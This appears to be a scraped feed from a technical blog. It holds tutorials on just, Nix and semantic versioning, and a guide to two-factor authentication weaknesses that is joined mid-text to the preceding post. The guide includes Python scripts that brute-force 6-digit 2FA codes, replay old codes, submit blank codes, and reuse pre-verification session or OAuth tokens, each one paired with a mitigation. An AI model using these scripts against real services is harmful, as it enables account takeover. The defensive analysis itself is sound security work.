You define tasks in a Justfile, and instead of remembering long commands, you can simply run just &lt;task&gt; to execute them. This makes project management much simpler. Creating a JustfileTo use just, create a Justfile in the root directory of your project. This file is where you define your tasks. Basic Task DefinitionA Justfile contains one or more tasks. Each task has a name followed by the commands you want to run. 12345# Justfile# Define a task called hellohello: echo &quot;Hello, World!&quot; Explanation: hello: is the task name. echo &quot;Hello, World!&quot; is the command that will run when you invoke this task. Running the TaskOnce you’ve created the Justfile, you can run the task in your terminal by typing: 1just hello You should see the following output: 1Hello, World! Using Variables in TasksYou can define variables in the Justfile and use them in your tasks. Variables are defined simply by assignment. Example:12345678# Justfile# Define a variablename := &quot;Alice&quot;# Define a taskgreet: echo &quot;Hello, &#123;&#123;name&#125;&#125;!&quot; &#123;&#123;name&#125;&#125; will be replaced with the value of the name variable. When you run the task: 1just greet The output will be: 1Hello, Alice! Using Command-Line ArgumentsYou can also pass arguments from the command line to your tasks. This is useful if you want your tasks to be dynamic and change based on input. 12345# Justfile# Task with command-line argumentgreet_name name: echo &quot;Hello, &#123;&#123;name&#125;&#125;!&quot; Now you can run the task and provide a name as an argument: 1just greet_name Bob Output: 1Hello, Bob! Task DependenciesYou can make tasks depend on other tasks. This allows you to chain tasks together, ensuring that one task runs before another. Example:123456789# Justfile# Define a setup tasksetup: echo &quot;Setting up the environment&quot;# Define a build task, which depends on setupbuild: setup echo &quot;Building the project&quot; In this case, running just build will first execute the setup task, and then it will proceed with the build task: 1just build Output: 12Setting up the environmentBuilding the project Conditionals and Loopsjust supports basic conditionals and loops, which you can use to add more logic to your tasks. Conditional Example:123456789# Justfile# Task: Check environmentcheck_env: if test -f &quot;dev.env&quot;; then echo &quot;Development environment detected&quot; else echo &quot;Production environment detected&quot; fi This example checks if the dev.env file exists and prints a message based on whether it’s found. Loop Example:1234567# Justfile# Task: Print numbers from 1 to 5print_numbers: for i in &#123;1..5&#125;; do echo &quot;Number: $i&quot; done Using Just for Python ProjectsIf you have a Python project, you can use just to manage common tasks like running tests, installing dependencies, or running your application. 12345678910111213# Justfile# Task: Install dependenciesinstall: pip install -r requirements.txt# Task: Run the Python scriptrun: python3 app.py# Task: Run unit teststest: pytest tests/ Now, you can run these tasks simply by typing: 123just install # Install dependenciesjust run # Run the Python scriptjust test # Run unit tests Advanced Usage: Skipping TasksYou can skip a task’s execution by prefixing its name with @. This is useful when you want to skip a task in a chain. 1just @install This will skip the install task and proceed with the next task.","pubDate":"Fri, 07 Feb 2025 17:51:09 GMT","guid":"http://iaaaannn0.com/2025/02/07/Efficient-Python-Project-Management-with-Just/","category":["just"]},{"title":"Reproducible Builds with Nix Step by Step Guide","link":"http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/","description":"Nix is a powerful package manager that provides reproducible builds, isolated environments, and efficient package management. In this guide, we’ll explore how to use Nix for package management and environment setups. 1. Installing Software Packages with NixTo install software packages, Nix uses the nix-env command. You can install a package with the following command: 1nix-env -i &lt;package-name&gt; For example, to install the hello package, use: 1nix-env -i hello 2. Searching for PackagesYou can search for available packages in the Nix package repository using the following command: 1nix-env -qaP &lt;package-name&gt; For example, to search for packages related to hello: 1nix-env -qaP hello This will list all available packages matching the name hello. 3. Listing Installed PackagesTo see the list of installed packages, use the following command: 1nix-env -q This will display all the currently installed packages on your system. 4. Upgrading Installed PackagesTo upgrade all installed packages to their latest versions, run: 1nix-env -u If you want to upgrade a specific package, for example, hello, you can use: 1nix-env -u hello 5. Removing PackagesIf you no longer need a particular package, you can uninstall it using the nix-env command: 1nix-env -e &lt;package-name&gt; For example, to uninstall hello, use: 1nix-env -e hello 6. Using nix-shell for Isolated EnvironmentsNix provides nix-shell, which allows you to enter an isolated environment with specific dependencies. You can create a shell.nix file to define the environment for a project. Here’s an example of a shell.nix file: 1234567# shell.nixwith import &lt;nixpkgs&gt; &#123;&#125;;stdenv.mkDerivation &#123; name = &quot;hello-env&quot;; buildInputs = [ hello ];&#125; Once the shell.nix file is defined, enter the environment by running: 1nix-shell This will create a shell environment where the hello package and its dependencies are available. 7. Nix Configuration FilesIn Nix, you can use configuration files to manage dependencies and software installation. Here’s an example of how to define a configuration in a Nix file. You can create a configuration file (e.g., default.nix) that specifies the packages to be installed: 1234567# default.nixwith import &lt;nixpkgs&gt; &#123;&#125;;stdenv.mkDerivation &#123; name = &quot;my-environment&quot;; buildInputs = [ vim hello ];&#125; Commenting in Nix Configuration FilesNix allows you to add comments to your configuration files for clarity. Use # to add a comment: 1234567# This is a simple Nix configuration filewith import &lt;nixpkgs&gt; &#123;&#125;;stdenv.mkDerivation &#123; name = &quot;my-environment&quot;; buildInputs = [ vim hello ]; # Install vim and hello package&#125; In this example: with import &lt;nixpkgs&gt;: Imports the Nix Packages collection. stdenv.mkDerivation: Creates a custom environment. buildInputs: Specifies which packages (like vim and hello) to include in the environment.","pubDate":"Thu, 06 Feb 2025 19:53:33 GMT","guid":"http://iaaaannn0.com/2025/02/07/Reproducible-Builds-with-Nix-Step-by-Step-Guide/","category":["nix"]},{"title":"Semantic Versioning for GitHub Releases","link":"http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/","description":"What is Semantic Versioning (SemVer)?Semantic Versioning (SemVer) is a widely adopted standard for naming software versions. It follows this format: 1MAJOR.MINOR.PATCH For example: 1v1.0.0 Each part of the version number has a specific meaning: MAJOR: Significant changes that break backward compatibility. MINOR: New features that are backward compatible. PATCH: Bug fixes and small improvements that do not change functionality. Examples of Stable Releases: Version Description v1.0.0 First stable release v1.1.0 Adds new features, backward compatible v1.1.1 Bug fix release, backward compatible v2.0.0 Breaking changes introduced Pre-release Versions (Testing Versions)Before an official stable release, you may want to publish a pre-release version for testing purposes.

However, vulnerabilities in the implementation, setup, or management of 2FA can undermine its effectiveness. 2FA Setup&#x2F;Implementation1. 2FA Secret Cannot Be RotatedIn many systems, once a 2FA secret (e.g., a key or QR code) is generated, it cannot be rotated or updated. This becomes a problem if the secret is ever exposed, as it leaves the account permanently vulnerable. Impact: If the 2FA secret is compromised, the attacker gains long-term access without the user being able to recover. Solution: Always provide users with the option to securely rotate their 2FA secret. Implement a mechanism to invalidate old secrets and ensure the new one is immediately effective. 2. 2FA Secret Remains Obtainable After 2FA Is EnabledA common issue is leaving the 2FA secret accessible after the initial setup. If a user’s QR code or secret key is stored insecurely or remains visible in the user interface, attackers can retrieve it even after 2FA has been enabled. Impact: This allows an attacker to bypass 2FA protections by using the exposed secret. Solution: Remove or obfuscate the 2FA secret immediately after it is set up. Ensure secrets are never logged, stored in plaintext, or exposed in server responses. 3. Logic Bugs in 2FA SetupPoorly designed logic in the 2FA setup process can cause unintended consequences, such as locking users out of their accounts or corrupting existing authentication settings. For example, systems that allow enabling 2FA without proper state validation can create inconsistencies. Impact: Logic errors can cause account damage or allow attackers to exploit weak points in the setup process. Solution: Thoroughly test the 2FA setup process for edge cases, such as interrupted sessions, invalid requests, and duplicated operations. Use state validation mechanisms to prevent unintended behavior. 4. Previously Created Sessions Remain Valid After 2FA ActivationWhen a user enables 2FA, all active sessions should be invalidated. However, many systems fail to do this, leaving old sessions operational. This can allow attackers with access to an existing session to bypass the new 2FA requirement. Impact: Attackers with access to an active session can continue to operate without being prompted for 2FA. Solution: Automatically terminate all active sessions when 2FA is enabled. Notify users of the session termination and give them control over managing active sessions. 5. Enabling 2FA Without Email VerificationSome systems allow users to enable 2FA without verifying their email or identity. This is problematic because attackers who have gained access to an account could enable and misuse 2FA, making it difficult for the legitimate user to regain control. Impact: Attackers can establish control over an account’s 2FA without proper verification, locking out the legitimate user. Solution: Enforce email or identity verification before allowing users to enable 2FA. This ensures only authorized users can modify security settings. 6. IDOR Vulnerabilities Leading to Account TakeoverInsecure Direct Object References (IDOR) in 2FA-related endpoints can be exploited to modify or access another user’s 2FA settings. For example, attackers could manipulate API requests to enable or disable 2FA for other accounts. Impact: Attackers can take over accounts by altering 2FA settings without authorization. Solution: Implement robust access control mechanisms for all 2FA-related API endpoints. Use user-specific identifiers bound to sessions and validate all requests server-side. 2FA Bypass Vulnerabilities: Detailed Steps and Examples1. 2FA Code Leakage in ResponsesIf 2FA codes are sent in responses from the server to the client, attackers can intercept them using tools like proxies (e.g., Burp Suite) or by monitoring logs. Exploit Steps: Initiate a 2FA login request. Use a proxy to inspect the server’s HTTP response. Look for fields containing the current 2FA code in the JSON or HTML response. Example Response: 12345&#123; &quot;status&quot;: &quot;success&quot;, &quot;2fa_code&quot;: &quot;123456&quot;, &quot;message&quot;: &quot;Verification code sent to your device.&quot;&#125; Attack: By capturing the 2fa_code field, an attacker can bypass the need for real-time code input. Mitigation: Never send 2FA codes or sensitive information in server responses. Use one-time codes that are validated server-side without revealing them to the client. 2. Reusing Old 2FA CodesIf old 2FA codes are not invalidated after generating a new one, attackers can reuse previously intercepted codes. Exploit Steps: Capture a valid 2FA code during a login session. Generate a new 2FA code (e.g., by triggering another login attempt). Use the previously captured code instead of the latest one. Example Exploit Code: 123456789101112import requests# Simulate loginlogin_payload = &#123;&quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;session = requests.Session()response = session.post(&quot;https://example.com/login&quot;, data=login_payload)# Use old codebypass_payload = &#123;&quot;2fa_code&quot;: &quot;123456&quot;&#125; # Old captured codebypass_response = session.post(&quot;https://example.com/verify-2fa&quot;, data=bypass_payload)print(bypass_response.status_code) # Should return 200 if bypassed Mitigation: Immediately invalidate old codes when new codes are generated. Use nonce-based validation to ensure that only the most recent code is valid. 3. Lack of Rate-Limiting (Brute-Force Attack)Without rate limits, attackers can brute-force 2FA codes by rapidly trying all possible combinations (e.g., 000000 to 999999). Exploit Steps: Write a script to automate code guessing. Continuously send requests until the correct code is found. Example Attack Script: 123456789101112import requestsurl = &quot;https://example.com/verify-2fa&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;for code in range(1000000): # 6-digit codes payload = &#123;&quot;2fa_code&quot;: f&quot;&#123;code:06&#125;&quot;&#125; response = requests.post(url, data=payload, headers=headers) if response.status_code == 200: # Success print(f&quot;Code found: &#123;code:06&#125;&quot;) break Mitigation: Enforce rate-limiting (e.g., 5 attempts per minute per IP). Introduce account lockouts or CAPTCHA after repeated failures. 4. Bypassing 2FA with Null or Blank ValuesSome systems improperly validate 2FA codes, allowing null or blank values to bypass authentication. Exploit Steps: Attempt to submit an empty or invalid 2fa_code field. Check if authentication succeeds despite no valid code. Example Exploit: 123456import requestspayload = &#123;&quot;2fa_code&quot;: &quot;&quot;&#125;response = requests.post(&quot;https://example.com/verify-2fa&quot;, data=payload)print(response.status_code) # 200 indicates successful bypass Mitigation: Validate input server-side to reject null, empty, or default values. Use strict validation checks for format and length (e.g., exactly 6 digits). 5. Misconfigured Session PermissionsIf session management is not properly configured, attackers may bypass 2FA by directly accessing authenticated endpoints without completing 2FA verification. Exploit Steps: Intercept the session token after login but before 2FA verification. Use the session token to access authenticated endpoints. Example Exploit: 12345678910import requests# Assume session token is captured before 2FAsession_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;# Access a protected endpointheaders = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;session_token&#125;&quot;&#125;response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)print(response.status_code) # 200 indicates bypass Mitigation: Mark sessions as “partial” until 2FA is completed. Restrict access to sensitive endpoints until full authentication is confirmed. 6. Referrer Check Bypass with Direct RequestsIf 2FA verification relies on referrer headers, attackers can bypass these checks by crafting direct requests. Exploit Steps: Inspect network traffic for referrer-based verification. Send a crafted HTTP request without the expected referrer. Example Exploit: 123456import requestsheaders = &#123;&quot;Referer&quot;: &quot;https://example.com/legitimate-page&quot;&#125;response = requests.post(&quot;https://example.com/verify-2fa&quot;, headers=headers)print(response.status_code) # Should bypass referrer-based restrictions Mitigation: Avoid relying solely on referrer headers for verification. Use session-bound tokens or other mechanisms to validate request authenticity. 7. Using OAuth for 2FA BypassIf 2FA integration with OAuth is poorly configured, attackers can exploit token exchange mechanisms to bypass 2FA. Exploit Steps: Exploit a misconfigured OAuth endpoint to request access tokens without completing 2FA. Use the token to authenticate directly. Example Exploit: 123456789101112import requests# Request token from misconfigured endpointtoken_response = requests.post(&quot;https://example.com/oauth/token&quot;, data=&#123;&quot;grant_type&quot;: &quot;password&quot;, &quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;)access_token = token_response.json().get(&quot;access_token&quot;)# Use the token to bypass 2FAheaders = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;access_token&#125;&quot;&#125;response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)print(response.status_code) # 200 indicates bypass Mitigation: Require 2FA completion before issuing access tokens. Validate tokens for proper authentication scope and origin. Additional Vulnerabilities in 2FA Disabling1. Lack of Log AuditingIf 2FA enable&#x2F;disable actions are not logged properly, attackers can disable 2FA without detection, leaving the user and administrators unaware of the breach. Impact: Attackers can disable 2FA stealthily, making accounts vulnerable. Mitigation: Log all 2FA-related actions, including enabling, disabling, and failed attempts. Include details like timestamps, IP addresses, and user-agent strings in the logs. Code Example: 123456789101112def disable_2fa(user_id): # Perform the 2FA disabling logic perform_disable_2fa(user_id) # Log the action log_action( user_id=user_id, action=&quot;2FA Disabled&quot;, ip_address=get_client_ip(), user_agent=get_user_agent(), timestamp=get_current_timestamp() ) 2. Weak Backup Code SecurityBackup codes are often provided for account recovery if the primary 2FA device is unavailable. If these codes are predictable, insufficiently long, or not invalidated after use, attackers can exploit them. Impact: Attackers can guess or steal backup codes to disable 2FA. Mitigation: Generate backup codes with sufficient complexity (e.g., random alphanumeric strings). Automatically invalidate used codes. Require additional verification (e.g., password input) to use backup codes. Code Example: 123456789101112import secretsimport stringdef generate_backup_code(): return &#x27;&#x27;.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))def validate_backup_code(user_id, input_code): stored_code = get_user_backup_code(user_id) if stored_code and input_code == stored_code: invalidate_backup_code(user_id) return True return False 3. Lack of Notification MechanismIf users are not notified when 2FA is disabled, attackers can disable 2FA without the user’s knowledge, leaving accounts exposed. Impact: The legitimate user remains unaware of the security breach. Mitigation: Send real-time notifications (email, SMS, or push) to users whenever 2FA settings are modified. Include information about the device, IP address, and timestamp in the notification. Code Example: 1234567def notify_user(user_id, action): user_email = get_user_email(user_id) send_email( to=user_email, subject=&quot;Security Alert: 2FA Disabled&quot;, message=f&quot;Your 2FA was disabled at &#123;get_current_timestamp()&#125; from IP &#123;get_client_ip()&#125;.&quot; ) 4. Sensitive Operations Lack Additional VerificationSystems often fail to require additional verification (e.g., password input) when disabling 2FA, making it easier for attackers to perform this action if they gain access to the account. Impact: Attackers can easily disable 2FA without the need for additional authentication. Mitigation: Require users to re-enter their password or confirm their identity through another method (e.g., biometric authentication) before disabling 2FA. Code Example: 123456789def verify_password(user_id, input_password): stored_hash = get_user_password_hash(user_id) return check_password_hash(input_password, stored_hash)def disable_2fa_with_verification(user_id, input_password): if verify_password(user_id, input_password): perform_disable_2fa(user_id) else: raise Exception(&quot;Password verification failed.&quot;) 5. Session Token Not Expired After 2FA DisablingIf session tokens are not invalidated after disabling 2FA, attackers can continue using the old session without triggering new authentication. Impact: Attackers with an active session can bypass any changes in authentication settings. Mitigation: Revoke all active sessions after disabling 2FA. Require the user to log in again with updated authentication settings. Code Example: 1234567def revoke_all_sessions(user_id): # Remove all active sessions from the database delete_sessions_for_user(user_id)def disable_2fa(user_id): perform_disable_2fa(user_id) revoke_all_sessions(user_id) 6. CSRF Vulnerabilities in 2FA-Related ActionsCross-Site Request Forgery (CSRF) vulnerabilities can allow attackers to trick authenticated users into disabling 2FA without their knowledge. Impact: Attackers can craft malicious links or forms to disable 2FA on behalf of the user. Mitigation: Use CSRF tokens for all 2FA-related actions. Validate the token server-side for each request. Code Example: 12345678def validate_csrf_token(input_token, session_token): return input_token == session_tokendef disable_2fa(request, user_id): csrf_token = request.get(&quot;csrf_token&quot;) if not validate_csrf_token(csrf_token, get_session_csrf_token(user_id)): raise Exception(&quot;CSRF token validation failed.&quot;) perform_disable_2fa(user_id) 7. Misuse of Developer Debug ModesIn some cases, debug modes allow bypassing 2FA for testing purposes. If left enabled in production, attackers can exploit these debug features. Impact: Attackers can completely bypass 2FA protections. Mitigation: Ensure debug modes are disabled in production builds. Implement runtime checks to verify that debug flags are not present. Code Example: 1234567def ensure_debug_mode_disabled(): if is_debug_mode(): raise Exception(&quot;Debug mode is enabled in production!&quot;)def perform_sensitive_action(): ensure_debug_mode_disabled() # Proceed with action 8. Poorly Configured API PermissionsAPIs that allow 2FA disabling may not properly restrict access. Attackers can exploit misconfigured permissions to disable 2FA via APIs. Impact: Attackers can send unauthorized API requests to disable 2FA. Mitigation: Implement strict authentication and authorization checks for API endpoints. Require API requests to be signed and session-bound. Code Example: 12345def disable_2fa_api(request, user_id): api_token = request.headers.get(&quot;Authorization&quot;) if not validate_api_token(api_token, user_id): raise Exception(&quot;Invalid API token.&quot;) perform_disable_2fa(user_id)","pubDate":"Wed, 05 Feb 2025 12:17:16 GMT","guid":"http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/","category":["vuls"]},{"title":"A Comprehensive Guide to Managing Python Projects with Poetry","link":"http://iaaaannn0.com/2025/01/30/poetry/","description":"Poetry is a powerful dependency management and packaging tool for Python.
